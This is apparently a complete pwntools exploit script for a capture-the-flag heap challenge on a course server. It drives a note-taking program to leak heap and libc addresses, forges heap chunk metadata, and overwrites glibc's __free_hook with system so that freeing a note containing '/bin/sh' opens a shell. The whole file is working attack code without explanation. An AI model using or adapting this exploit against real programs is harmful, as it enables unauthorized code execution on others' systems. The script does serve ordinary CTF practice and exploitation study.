#!/usr/bin/env python3

from pwn import *

exe = ELF("chal_patched")
libc = ELF("libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process('./chal_patched')
p = remote('edu-ctf.zoolab.org', '10015')
def add_note(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index\n> ', idx)
    print('add_note', p.recvline())

def edit_data(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index\n> ', idx)
    p.sendlineafter(b'size\n> ', size)
    if( size != b'0'):
        p.sendline(data)
    print('edit_data', p.recvline())

def del_note(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index\n> ', idx)
    #print('del_note', p.recvline())

def show_note(c):
    p.sendlineafter(b'> ', b'4')
    if c == 0:
        print(p.recvline())
    elif c == 1: # heap leak
        s = p.recv(10)[4:]
        return u64(s.ljust(8, b'\x00'))
    elif c == 2: # libc leak
        #print(p.recvuntil(b'add_note')[9:9+6])
        return (u64(p.recvuntil(b'add_note')[9:9+6].ljust(8, b'\x00')))
        #return u64(p.recv(15)[9:].ljust(8, b'\x00'))
    return

raw_input('>')
# testing...

# 1. get heap first
add_note(b'0')
edit_data(b'0', b'10', b'wow')
add_note(b'1')
del_note(b'1')
del_note(b'0')
add_note(b'0')
edit_data(b'0', b'0', b'w')
heap_leak = show_note(1) # leak chunks 1 position
print(hex(heap_leak))
top_chunk = heap_leak - 0x2d0

add_note(b'1') 
edit_data(b'1', b'112', b'woww')
add_note(b'2')
edit_data(b'2', b'112', b'woww')
add_note(b'3') 
edit_data(b'3', b'112', b'woww')
add_note(b'4') 
edit_data(b'4', b'112', b'woww')
add_note(b'5')
edit_data(b'5', b'112', b'woww')
add_note(b'6')
edit_data(b'6', b'112', b'woww')
add_note(b'7')
edit_data(b'7', b'112', b'woww')
add_note(b'8')
edit_data(b'8', b'112', b'woww')
add_note(b'9')
edit_data(b'9', b'112', b'woww')
add_note(b'10')
edit_data(b'10', b'112', b'woww')
add_note(b'11')
edit_data(b'11', b'112', b'/bin/sh\x00')

del_note(b'1')
del_note(b'2')
del_note(b'3')
del_note(b'4')
del_note(b'5')
del_note(b'6')
del_note(b'7')
del_note(b'0')

add_note(b'7')
edit_data(b'7', b'112', b'wow')
add_note(b'6')
edit_data(b'6', b'112', b'wow')
add_note(b'5')
edit_data(b'5', b'112', b'wow')
add_note(b'4')
edit_data(b'4', b'112', b'wow')
add_note(b'3')
edit_data(b'3', b'112', b'wow')
add_note(b'2')
edit_data(b'2', b'112', b'wow')
add_note(b'1')
edit_data(b'1', b'112', b'wow')
add_note(b'0')
print('ready to write fake payload')
# 0x121, [1d, 2d]
# 0x141, [1d,  3]
# 0x261, [1d, 4d]
# 0x281, [1d,  5]
# 0x3a1, [1d, 6d]
# 0x3c1, [1d,  7]
# 0x4e1, [1d, 8d]

big_chunk = top_chunk + 0x2f0

print('top_chunk = ',hex(top_chunk))
print('big_chunk = ',hex(big_chunk))

fake_payload = flat(
    0x00, top_chunk,
    0x00, 0x21,
    0x70, big_chunk,
    0x00, 0x4e1,
)
edit_data(b'0', b'117', fake_payload)
del_note(b'1')
add_note(b'1')


payload_overwrite_pointer = flat(
    0x00, top_chunk,
    0x00, 0x21,
    0x4e0, big_chunk,
)

edit_data(b'0', b'117', payload_overwrite_pointer)
libc_leak = show_note(2)
libc_base = libc_leak - 0x1ecbe0
print(hex(libc_leak))
print(hex(libc_base))


libc.address = libc_base
print('free_hook', hex(libc.symbols['__free_hook']))
print('system', hex(libc.symbols['system']))

payload_overwrite_free_hook = flat(
    0x00, top_chunk,
    0x00, 0x21,
    0x4e0, libc.symbols['__free_hook'],
)

edit_data(b'0', b'117', payload_overwrite_free_hook)
edit_data(b'1', b'117', p64(libc.symbols['system']))

del_note(b'11')

raw_input('>')
p.interactive()